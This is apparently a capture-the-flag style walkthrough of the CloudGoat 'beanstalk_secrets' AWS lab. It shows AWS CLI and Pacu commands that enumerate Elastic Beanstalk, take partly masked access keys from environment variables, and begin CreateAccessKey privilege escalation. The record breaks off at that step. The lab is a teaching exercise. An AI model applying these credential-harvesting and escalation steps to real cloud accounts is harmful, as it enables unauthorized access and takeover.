## Background ##
You have been hired as an AWS Penetration Tester for Hack Smarter. Hack Smarter uses Elastic Beanstalk to host some of their public-facing web applications. ** They have provided you with a low-level account that has access to Elastic Beanstalk.**

### Starting up of the Scenario ###

To start the scenario in cloudgoat, run 

``` cloudgoat create beanstalk_secrets ```

### Initial Credential###

After the initialization of the cloudgoat scenario, a set of credentials in the form of AWS access key and secrets is given.

Running ``` aws configure --profile beanstalks ```, we create a aws profile call beanstalks by providing the AWS access key, secrets, the region to be ```us-east-1``` and format ```json```.

After successfully creating a profile called beanstalks and we can run the command below to get the account name

```
aws sts get-caller-identity --profile beanstalks
```

We find that we are ```cgidkklcl54ir4_low_priv_user```, showing that we are a low privilege user.

```
{
    "UserId": "AIDAYKFQRAGORGKGH624V",
    "Account": "571600863645",
    "Arn": "arn:aws:iam::571600863645:user/cgidkklcl54ir4_low_priv_user"
}
```

### AWS Beanstalk Enumeration ###
Given that we know that our task is to pentest the Elastic Beanstalk, we can first enumerate the configuration of the Elastic Beanstalk

We first need to enumerate the application/s that are available to the account

```
aws elasticbeanstalk describe-applications --profile beanstalks
```
By running the above command, we managed to find that there is an application present that is called ```cgidkklcl54ir4-app```

```
{
    "Applications": [
        {
            "ApplicationArn": "arn:aws:elasticbeanstalk:us-east-1:571600863645:application/cgidkklcl54ir4-app",
            "ApplicationName": "cgidkklcl54ir4-app",
            "Description": "Elastic Beanstalk application for insecure secrets scenario",
            "DateCreated": "2025-09-13T05:37:29.065Z",
            "DateUpdated": "2025-09-13T05:37:29.065Z",
            "ConfigurationTemplates": [],
            "ResourceLifecycleConfig": {
                "VersionLifecycleConfig": {
                    "MaxCountRule": {
                        "Enabled": false,
                        "MaxCount": 200,
                        "DeleteSourceFromS3": false
                    },
                    "MaxAgeRule": {
                        "Enabled": false,
                        "MaxAgeInDays": 180,
                        "DeleteSourceFromS3": false
                    }
                }
            }
        }
    ]
    
}
```

### List the environment configuration of the beanstalk of interest ###

Next we will try to enumerate for the detailed configuration of the beanstalk

```
aws elasticbeanstalk describe-environments --application-name cgidkklcl54ir4-app --profile beanstalks
```
By running the command above, we can get the environment configuration of the application of interest.


```
{
    "Environments": [
        {
            "EnvironmentName": "cgidkklcl54ir4-env",
            "EnvironmentId": "e-95ryc6ercp",
            "ApplicationName": "cgidkklcl54ir4-app",
            "SolutionStackName": "64bit Amazon Linux 2023 v4.7.1 running Python 3.11",
            "PlatformArn": "arn:aws:elasticbeanstalk:us-east-1::platform/Python 3.11 running on 64bit Amazon Linux 2023/4.7.1",
            "EndpointURL": "awseb-e-9-AWSEBLoa-15RMQS56VI7ZF-797245562.us-east-1.elb.amazonaws.com",
            "CNAME": "cgidkklcl54ir4-env.eba-tvx8xpqe.us-east-1.elasticbeanstalk.com",
            "DateCreated": "2025-09-13T05:37:52.666Z",
            "DateUpdated": "2025-09-13T05:40:36.441Z",
            "Status": "Ready",
            "AbortableOperationInProgress": false,
            "Health": "Grey",
            "HealthStatus": "No Data",
            "Tier": {
                "Name": "WebServer",
                "Type": "Standard",
                "Version": "1.0"
            },
            "EnvironmentLinks": [],
            "EnvironmentArn": "arn:aws:elasticbeanstalk:us-east-1:571600863645:environment/cgidkklcl54ir4-app/cgidkklcl54ir4-env"
        }
    ]
}
```

### Get Information of the Environment Configurations of the application of interest###

With the application and environment name in hand, we can proceed with the enumeration of the environment configurations of the application.

```
aws elasticbeanstalk describe-configuration-settings --application-name cgidkklcl54ir4-app --environment-name cgidkklcl54ir4-env --profile beanstalks
```

```
{
    "ConfigurationSettings": [
        {
            "SolutionStackName": "64bit Amazon Linux 2023 v4.7.1 running Python 3.11",
            "PlatformArn": "arn:aws:elasticbeanstalk:us-east-1::platform/Python 3.11 running on 64bit Amazon Linux 2023/4.7.1",
            "ApplicationName": "cgidkklcl54ir4-app",
            "EnvironmentName": "cgidkklcl54ir4-env",
            "DeploymentStatus": "deployed",
            "DateCreated": "2025-09-13T05:37:51Z",
            "DateUpdated": "2025-09-13T05:37:51Z",
            "OptionSettings": [
                {
                    "ResourceName": "AWSEBAutoScalingGroup",
                    "Namespace": "aws:autoscaling:asg",
                    "OptionName": "Availability Zones",
                    "Value": "Any"
                },
                {
                    "ResourceName": "AWSEBAutoScalingGroup",
                    "Namespace": "aws:autoscaling:asg",
                    "OptionName": "Cooldown",
                    "Value": "360"
                },
                {
                    "ResourceName": "AWSEBAutoScalingGroup",
                    "Namespace": "aws:autoscaling:asg",
                    "OptionName": "Custom Availability Zones",
                    "Value": ""
                },
                {
                    "ResourceName": "AWSEBAutoScalingGroup",
                    "Namespace": "aws:autoscaling:asg",
                    "OptionName": "EnableCapacityRebalancing",
                    "Value": "false"
                },
                {
                    "ResourceName": "AWSEBAutoScalingGroup",
                    "Namespace": "aws:autoscaling:asg",
                    "OptionName": "MaxSize",
                    "Value": "4"
                },
                {
                    "ResourceName": "AWSEBAutoScalingGroup",
                    "Namespace": "aws:autoscaling:asg",
                    "OptionName": "MinSize",
                    "Value": "1"
                },
                {
                    "ResourceName": "AWSEBEC2LaunchTemplate",
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "BlockDeviceMappings"
                },
                {
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "DisableDefaultEC2SecurityGroup",
                    "Value": "false"
                },
                {
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "DisableIMDSv1",
                    "Value": "true"
                },
                {
                    "ResourceName": "AWSEBEC2LaunchTemplate",
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "EC2KeyName"
                },
                {
                    "ResourceName": "AWSEBEC2LaunchTemplate",
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "IamInstanceProfile",
                    "Value": "cgidkklcl54ir4_eb_instance_profile"
                },
                {
                    "ResourceName": "AWSEBEC2LaunchTemplate",
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "ImageId",
                    "Value": "ami-0b63791dd3c94cfa0"
                },
                {
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "InstanceType",
                    "Value": "t3.micro"
                },
                {
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "LaunchTemplateTagPropagationEnabled"
                },
                {
                    "ResourceName": "AWSEBEC2LaunchTemplate",
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "MonitoringInterval",
                    "Value": "5 minute"
                },
                {
                    "ResourceName": "AWSEBEC2LaunchTemplate",
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "RootVolumeIOPS"
                },
                {
                    "ResourceName": "AWSEBEC2LaunchTemplate",
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "RootVolumeSize"
                },
                {
                    "ResourceName": "AWSEBEC2LaunchTemplate",
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "RootVolumeThroughput"
                },
                {
                    "ResourceName": "AWSEBEC2LaunchTemplate",
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "RootVolumeType"
                },
                {
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "SSHSourceRestriction",
                    "Value": "tcp,22,22,0.0.0.0/0"
                },
                {
                    "ResourceName": "AWSEBEC2LaunchTemplate",
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "SecurityGroups",
                    "Value": "sg-0bb3b1afd4b2f9c0a"
                },
                {
                    "ResourceName": "AWSEBCloudwatchAlarmLow",
                    "Namespace": "aws:autoscaling:trigger",
                    "OptionName": "BreachDuration",
                    "Value": "5"
                },
                {
                    "ResourceName": "AWSEBCloudwatchAlarmLow",
                    "Namespace": "aws:autoscaling:trigger",
                    "OptionName": "EvaluationPeriods",
                    "Value": "1"
                },
                {
                    "ResourceName": "AWSEBAutoScalingScaleDownPolicy",
                    "Namespace": "aws:autoscaling:trigger",
                    "OptionName": "LowerBreachScaleIncrement",
                    "Value": "-1"
                },
                {
                    "ResourceName": "AWSEBCloudwatchAlarmLow",
                    "Namespace": "aws:autoscaling:trigger",
                    "OptionName": "LowerThreshold",
                    "Value": "2000000"
                },
                {
                    "ResourceName": "AWSEBCloudwatchAlarmLow",
                    "Namespace": "aws:autoscaling:trigger",
                    "OptionName": "MeasureName",
                    "Value": "NetworkOut"
                },
                {
                    "ResourceName": "AWSEBCloudwatchAlarmLow",
                    "Namespace": "aws:autoscaling:trigger",
                    "OptionName": "Period",
                    "Value": "5"
                },
                {
                    "ResourceName": "AWSEBCloudwatchAlarmLow",
                    "Namespace": "aws:autoscaling:trigger",
                    "OptionName": "Statistic",
                    "Value": "Average"
                },
                {
                    "ResourceName": "AWSEBCloudwatchAlarmLow",
                    "Namespace": "aws:autoscaling:trigger",
                    "OptionName": "Unit",
                    "Value": "Bytes"
                },
                {
                    "ResourceName": "AWSEBAutoScalingScaleUpPolicy",
                    "Namespace": "aws:autoscaling:trigger",
                    "OptionName": "UpperBreachScaleIncrement",
                    "Value": "1"
                },
                {
                    "ResourceName": "AWSEBCloudwatchAlarmHigh",
                    "Namespace": "aws:autoscaling:trigger",
                    "OptionName": "UpperThreshold",
                    "Value": "6000000"
                },
                {
                    "ResourceName": "AWSEBAutoScalingGroup",
                    "Namespace": "aws:autoscaling:updatepolicy:rollingupdate",
                    "OptionName": "MaxBatchSize"
                },
                {
                    "ResourceName": "AWSEBAutoScalingGroup",
                    "Namespace": "aws:autoscaling:updatepolicy:rollingupdate",
                    "OptionName": "MinInstancesInService"
                },
                {
                    "ResourceName": "AWSEBAutoScalingGroup",
                    "Namespace": "aws:autoscaling:updatepolicy:rollingupdate",
                    "OptionName": "PauseTime"
                },
                {
                    "ResourceName": "AWSEBAutoScalingGroup",
                    "Namespace": "aws:autoscaling:updatepolicy:rollingupdate",
                    "OptionName": "RollingUpdateEnabled",
                    "Value": "false"
                },
                {
                    "ResourceName": "AWSEBAutoScalingGroup",
                    "Namespace": "aws:autoscaling:updatepolicy:rollingupdate",
                    "OptionName": "RollingUpdateType",
                    "Value": "Time"
                },
                {
                    "ResourceName": "AWSEBAutoScalingGroup",
                    "Namespace": "aws:autoscaling:updatepolicy:rollingupdate",
                    "OptionName": "Timeout",
                    "Value": "PT30M"
                },
                {
                    "Namespace": "aws:cloudformation:template:parameter",
                    "OptionName": "AppSource",
                    "Value": "https://elasticbeanstalk-platform-assets-us-east-1.s3.amazonaws.com/stalks/eb_python311_amazon_linux_2023_1.0.927.0_20250819152009/sampleapp/EBSampleApp-Python.zip"
                },
                {
                    "Namespace": "aws:cloudformation:template:parameter",
                    "OptionName": "EnvironmentVariables",
                    "Value": "SECONDARY_SECRET_KEY=T+WHCzixZK3cwIi7******************,PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=AKIAYK******************"
                },
                {
                    "Namespace": "aws:cloudformation:template:parameter",
                    "OptionName": "HooksPkgUrl",
                    "Value": "https://elasticbeanstalk-platform-assets-us-east-1.s3.amazonaws.com/stalks/eb_python311_amazon_linux_2023_1.0.927.0_20250819152009/lib/hooks.tar.gz"
                },
                {
                    "Namespace": "aws:cloudformation:template:parameter",
                    "OptionName": "InstancePort",
                    "Value": "80"
                },
                {
                    "Namespace": "aws:cloudformation:template:parameter",
                    "OptionName": "InstanceTypeFamily",
                    "Value": "t3"
                },
                {
                    "Namespace": "aws:cloudformation:template:parameter",
                    "OptionName": "StaticFiles"
                },
                {
                    "Namespace": "aws:ec2:instances",
                    "OptionName": "EnableSpot",
                    "Value": "false"
                },
                {
                    "Namespace": "aws:ec2:instances",
                    "OptionName": "InstanceTypes",
                    "Value": "t3.micro, t3.small"
                },
                {
                    "Namespace": "aws:ec2:instances",
                    "OptionName": "SpotAllocationStrategy",
                    "Value": "capacity-optimized"
                },
                {
                    "Namespace": "aws:ec2:instances",
                    "OptionName": "SpotFleetOnDemandAboveBasePercentage",
                    "Value": "70"
                },
                {
                    "Namespace": "aws:ec2:instances",
                    "OptionName": "SpotFleetOnDemandBase",
                    "Value": "0"
                },
                {
                    "Namespace": "aws:ec2:instances",
                    "OptionName": "SpotMaxPrice"
                },
                {
                    "Namespace": "aws:ec2:instances",
                    "OptionName": "SupportedArchitectures",
                    "Value": "x86_64"
                },
                {
                    "ResourceName": "AWSEBEC2LaunchTemplate",
                    "Namespace": "aws:ec2:vpc",
                    "OptionName": "AssociatePublicIpAddress",
                    "Value": "true"
                },
                {
                    "Namespace": "aws:ec2:vpc",
                    "OptionName": "ELBScheme",
                    "Value": "public"
                },
                {
                    "Namespace": "aws:ec2:vpc",
                    "OptionName": "ELBSubnets",
                    "Value": "subnet-01c0ed40d0d4bc8bc"
                },
                {
                    "ResourceName": "AWSEBAutoScalingGroup",
                    "Namespace": "aws:ec2:vpc",
                    "OptionName": "Subnets",
                    "Value": "subnet-01c0ed40d0d4bc8bc"
                },
                {
                    "ResourceName": "AWSEBSecurityGroup",
                    "Namespace": "aws:ec2:vpc",
                    "OptionName": "VPCId",
                    "Value": "vpc-024a6ae4e19d4feea"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:application",
                    "OptionName": "Application Healthcheck URL",
                    "Value": ""
                },
                {
                    "Namespace": "aws:elasticbeanstalk:application:environment",
                    "OptionName": "PYTHONPATH",
                    "Value": "/var/app/venv/staging-LQM1lest/bin"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:application:environment",
                    "OptionName": "SECONDARY_ACCESS_KEY",
                    "Value": "AKIAY******************"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:application:environment",
                    "OptionName": "SECONDARY_SECRET_KEY",
                    "Value": "T+WHCzixZK3cwIi7******************"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:cloudwatch:logs",
                    "OptionName": "DeleteOnTerminate",
                    "Value": "false"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:cloudwatch:logs",
                    "OptionName": "RetentionInDays",
                    "Value": "7"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:cloudwatch:logs",
                    "OptionName": "StreamLogs",
                    "Value": "false"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:cloudwatch:logs:health",
                    "OptionName": "DeleteOnTerminate",
                    "Value": "false"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:cloudwatch:logs:health",
                    "OptionName": "HealthStreamingEnabled",
                    "Value": "false"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:cloudwatch:logs:health",
                    "OptionName": "RetentionInDays",
                    "Value": "7"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:command",
                    "OptionName": "BatchSize",
                    "Value": "100"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:command",
                    "OptionName": "BatchSizeType",
                    "Value": "Percentage"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:command",
                    "OptionName": "DeploymentPolicy",
                    "Value": "AllAtOnce"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:command",
                    "OptionName": "IgnoreHealthCheck",
                    "Value": "false"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:command",
                    "OptionName": "Timeout",
                    "Value": "600"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:container:python",
                    "OptionName": "NumProcesses",
                    "Value": "1"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:container:python",
                    "OptionName": "NumThreads",
                    "Value": "15"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:container:python",
                    "OptionName": "WSGIPath",
                    "Value": "application"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:control",
                    "OptionName": "DefaultSSHPort",
                    "Value": "22"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:control",
                    "OptionName": "LaunchTimeout",
                    "Value": "0"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:control",
                    "OptionName": "LaunchType",
                    "Value": "Migration"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:control",
                    "OptionName": "RollbackLaunchOnFailure",
                    "Value": "false"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:environment",
                    "OptionName": "EnvironmentType",
                    "Value": "LoadBalanced"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:environment",
                    "OptionName": "ExternalExtensionsS3Bucket"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:environment",
                    "OptionName": "ExternalExtensionsS3Key"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:environment",
                    "OptionName": "LoadBalancerType",
                    "Value": "classic"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:environment",
                    "OptionName": "ServiceRole",
                    "Value": "AWSServiceRoleForElasticBeanstalk"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:environment:proxy",
                    "OptionName": "ProxyServer",
                    "Value": "nginx"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:healthreporting:system",
                    "OptionName": "ConfigDocument",
                    "Value": "{\"Version\":1,\"CloudWatchMetrics\":{\"Instance\":{\"CPUIrq\":null,\"LoadAverage5min\":null,\"ApplicationRequests5xx\":null,\"ApplicationRequests4xx\":null,\"CPUUser\":null,\"LoadAverage1min\":null,\"ApplicationLatencyP50\":null,\"CPUIdle\":null,\"InstanceHealth\":null,\"ApplicationLatencyP95\":null,\"ApplicationLatencyP85\":null,\"RootFilesystemUtil\":null,\"ApplicationLatencyP90\":null,\"CPUSystem\":null,\"ApplicationLatencyP75\":null,\"CPUSoftirq\":null,\"ApplicationLatencyP10\":null,\"ApplicationLatencyP99\":null,\"ApplicationRequestsTotal\":null,\"ApplicationLatencyP99.9\":null,\"ApplicationRequests3xx\":null,\"ApplicationRequests2xx\":null,\"CPUIowait\":null,\"CPUNice\":null},\"Environment\":{\"InstancesSevere\":null,\"InstancesDegraded\":null,\"ApplicationRequests5xx\":null,\"ApplicationRequests4xx\":null,\"ApplicationLatencyP50\":null,\"ApplicationLatencyP95\":null,\"ApplicationLatencyP85\":null,\"InstancesUnknown\":null,\"ApplicationLatencyP90\":null,\"InstancesInfo\":null,\"InstancesPending\":null,\"ApplicationLatencyP75\":null,\"ApplicationLatencyP10\":null,\"ApplicationLatencyP99\":null,\"ApplicationRequestsTotal\":null,\"InstancesNoData\":null,\"ApplicationLatencyP99.9\":null,\"ApplicationRequests3xx\":null,\"ApplicationRequests2xx\":null,\"InstancesOk\":null,\"InstancesWarning\":null}}}"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:healthreporting:system",
                    "OptionName": "EnhancedHealthAuthEnabled",
                    "Value": "true"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:healthreporting:system",
                    "OptionName": "HealthCheckSuccessThreshold",
                    "Value": "Ok"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:healthreporting:system",
                    "OptionName": "SystemType",
                    "Value": "enhanced"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:hostmanager",
                    "OptionName": "LogPublicationControl",
                    "Value": "false"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:managedactions",
                    "OptionName": "ManagedActionsEnabled",
                    "Value": "false"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:managedactions",
                    "OptionName": "PreferredStartTime"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:managedactions",
                    "OptionName": "ServiceRoleForManagedUpdates",
                    "Value": ""
                },
                {
                    "Namespace": "aws:elasticbeanstalk:managedactions:platformupdate",
                    "OptionName": "InstanceRefreshEnabled",
                    "Value": "false"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:managedactions:platformupdate",
                    "OptionName": "UpdateLevel"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:monitoring",
                    "OptionName": "Automatically Terminate Unhealthy Instances",
                    "Value": "true"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:sns:topics",
                    "OptionName": "Notification Endpoint"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:sns:topics",
                    "OptionName": "Notification Protocol",
                    "Value": "email"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:sns:topics",
                    "OptionName": "Notification Topic ARN"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:sns:topics",
                    "OptionName": "Notification Topic Name"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:xray",
                    "OptionName": "XRayEnabled",
                    "Value": "false"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:healthcheck",
                    "OptionName": "HealthyThreshold",
                    "Value": "3"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:healthcheck",
                    "OptionName": "Interval",
                    "Value": "10"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:healthcheck",
                    "OptionName": "Target",
                    "Value": "TCP:80"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:healthcheck",
                    "OptionName": "Timeout",
                    "Value": "5"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:healthcheck",
                    "OptionName": "UnhealthyThreshold",
                    "Value": "5"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:listener:80",
                    "OptionName": "InstancePort",
                    "Value": "80"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:listener:80",
                    "OptionName": "InstanceProtocol",
                    "Value": "HTTP"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:listener:80",
                    "OptionName": "ListenerEnabled",
                    "Value": "true"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:listener:80",
                    "OptionName": "ListenerProtocol",
                    "Value": "HTTP"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:listener:80",
                    "OptionName": "SSLCertificateId"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:loadbalancer",
                    "OptionName": "CrossZone",
                    "Value": "false"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:loadbalancer",
                    "OptionName": "LoadBalancerHTTPPort",
                    "Value": "80"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:loadbalancer",
                    "OptionName": "LoadBalancerHTTPSPort",
                    "Value": "OFF"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:loadbalancer",
                    "OptionName": "LoadBalancerPortProtocol",
                    "Value": "HTTP"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:loadbalancer",
                    "OptionName": "LoadBalancerSSLPortProtocol",
                    "Value": "HTTPS"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:loadbalancer",
                    "OptionName": "SSLCertificateId"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:loadbalancer",
                    "OptionName": "SecurityGroups",
                    "Value": "sg-0782f584bfc788769"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:policies",
                    "OptionName": "ConnectionDrainingEnabled",
                    "Value": "false"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:policies",
                    "OptionName": "ConnectionDrainingTimeout",
                    "Value": "20"
                },
                {
                    "ResourceName": "AWSEBLoadBalancer",
                    "Namespace": "aws:elb:policies",
                    "OptionName": "ConnectionSettingIdleTimeout",
                    "Value": "60"
                },
                {
                    "Namespace": "aws:rds:dbinstance",
                    "OptionName": "HasCoupledDatabase",
                    "Value": "false"
                }
            ]
        }
    ]
}
```

Looking through the configuration, we can find a set of AWS credentials 

```                {
                    "Namespace": "aws:elasticbeanstalk:application:environment",
                    "OptionName": "SECONDARY_ACCESS_KEY",
                    "Value": "AKIAYK******************"
                },
                {
                    "Namespace": "aws:elasticbeanstalk:application:environment",
                    "OptionName": "SECONDARY_SECRET_KEY",
                    "Value": "T+WHCzixZK3cw******************"
                }
```

### Lateral Movement to new account###

Next we will continue to configure and start enumerate the new account that we got hang of.
I named the profile ```cloudformation2```

```
aws configure --profile cloudformation2
```

After configured the new account, we can run command to see our new identity.

```
aws sts get-caller-identity --profile cloudformation2
```

We are a secondary user.
```
{
    "UserId": "AIDAYKFQ******************",
    "Account": "571600863645",
    "Arn": "arn:aws:iam::571600863645:user/cgidkklcl54ir4_secondary_user"
}
```

### Using Pacu to enumerate the IAM permissions of the secondary account###

We can continue the enumeration of our secondary account via Pacu

```pacu```

We will start a new session in Pacu and give it a name like ```secondary```

```
Pacu (secondary:No Keys Set) > import_keys cloudformation2
  Imported keys as "imported-cloudformation2"
```

We can enumerate the account for iam roles and permissions via
```
run iam__enum_permissions
```
The following are the results we get

```
Running module iam__enum_permissions...
[iam__enum_permissions] Confirming permissions for users:
[iam__enum_permissions]   cgidkklcl54ir4_secondary_user...
[iam__enum_permissions]     List groups for user failed
[iam__enum_permissions]       FAILURE: MISSING REQUIRED AWS PERMISSIONS
[iam__enum_permissions]     List user policies failed
[iam__enum_permissions]       FAILURE: MISSING REQUIRED AWS PERMISSIONS
[iam__enum_permissions]     Confirmed Permissions for cgidkklcl54ir4_secondary_user
[iam__enum_permissions] iam__enum_permissions completed.

[iam__enum_permissions] MODULE SUMMARY:

   0 Confirmed permissions for 0 user(s).
   0 Confirmed permissions for 0 role(s).
  14 Unconfirmed permissions for user: cgidkklcl54ir4_secondary_user.
   0 Unconfirmed permissions for 0 role(s).
```

To get a detail of the permissions, we can run the command ```whoami``` to see
what are the information we currently gathered in the account.

```
{
  "UserName": "cgidkklcl54ir4_secondary_user",
  "RoleName": null,
  "Arn": "arn:aws:iam::571600863645:user/cgidkklcl54ir4_secondary_user",
  "AccountId": "571600863645",
  "UserId": "AIDAYKFQRAGOSBRYVQ3DP",
  "Roles": null,
  "Groups": [],
  "Policies": [
    {
      "PolicyName": "cgidkklcl54ir4_secondary_policy",
      "PolicyArn": "arn:aws:iam::571600863645:policy/cgidkklcl54ir4_secondary_policy"
    }
  ],
  "AccessKeyId": "AKIAYK******************",
  "SecretAccessKey": "T+WHCzixZK*****************************",
  "SessionToken": null,
  "KeyAlias": "imported-cloudformation2",
  "PermissionsConfirmed": false,
  "Permissions": {
    "Allow": {
      "iam:createaccesskey": {
        "Resources": [
          "*"
        ]
      },
      "iam:listgroups": {
        "Resources": [
          "*"
        ]
      },
      "iam:getrolepolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:listpolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:getgroup": {
        "Resources": [
          "*"
        ]
      },
      "iam:listusers": {
        "Resources": [
          "*"
        ]
      },
      "iam:listattacheduserpolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:getpolicyversion": {
        "Resources": [
          "*"
        ]
      },
      "iam:getuser": {
        "Resources": [
          "*"
        ]
      },
      "iam:listroles": {
        "Resources": [
          "*"
        ]
      },
      "iam:getrole": {
        "Resources": [
          "*"
        ]
      },
      "iam:getpolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:listattachedrolepolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:listpolicyversions": {
        "Resources": [
          "*"
        ]
      }
    },
    "Deny": {}
  }
}
```

### Using Pacu to Privilege Escalate###

Pacu has a very useful module called ```iam__privesc_scan```
Let us run it to see if there are available methods for us to escalate our privilege.

Pacu (secondary:imported-cloudformation2) > ==run iam__privesc_scan==
  Running module iam__privesc_scan...
[iam__privesc_scan] Escalation methods for current user:
[iam__privesc_scan]   POTENTIAL: AddUserToGroup
[iam__privesc_scan]   POTENTIAL: AttachGroupPolicy
[iam__privesc_scan]   POTENTIAL: AttachRolePolicy
[iam__privesc_scan]   POTENTIAL: AttachUserPolicy
[iam__privesc_scan]   POTENTIAL: CodeStarCreateProjectFromTemplate
[iam__privesc_scan]   POTENTIAL: CodeStarCreateProjectThenAssociateTeamMember
[iam__privesc_scan]   CONFIRMED: CreateAccessKey
[iam__privesc_scan]   POTENTIAL: CreateEC2WithExistingIP
[iam__privesc_scan]   POTENTIAL: CreateLoginProfile
[iam__privesc_scan]   POTENTIAL: CreateNewPolicyVersion
[iam__privesc_scan]   POTENTIAL: EditExistingLambdaFunctionWithRole
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewCloudFormation
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewCodeStarProject
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewDataPipeline
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewGlueDevEndpoint
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewLambdaThenInvoke
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewLambdaThenInvokeCrossAccount
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewLambdaThenTriggerWithNewDynamo
[iam__privesc_scan]   POTENTIAL: PutGroupPolicy
[iam__privesc_scan]   POTENTIAL: PutRolePolicy
[iam__privesc_scan]   POTENTIAL: PutUserPolicy
[iam__privesc_scan]   POTENTIAL: SetExistingDefaultPolicyVersion
[iam__privesc_scan]   POTENTIAL: UpdateExistingGlueDevEndpoint
[iam__privesc_scan]   POTENTIAL: UpdateLoginProfile
[iam__privesc_scan]   POTENTIAL: UpdateRolePolicyToAssumeIt
[iam__privesc_scan] Attempting confirmed privilege escalation methods...
```

Pacu managed to find a confirmed method to privilege escalate, which is via ```CreateAccessKey```
In real life engagement, we might not want to let Pacu to proceed directly to the act of privilege escalation, hence when running the module, we can add ```--scan-only``` to end of the command so that the module stop after scan.

But for our case, we continue the privilege escalation action

```
[iam__privesc_scan]   Starting method CreateAccessKey...

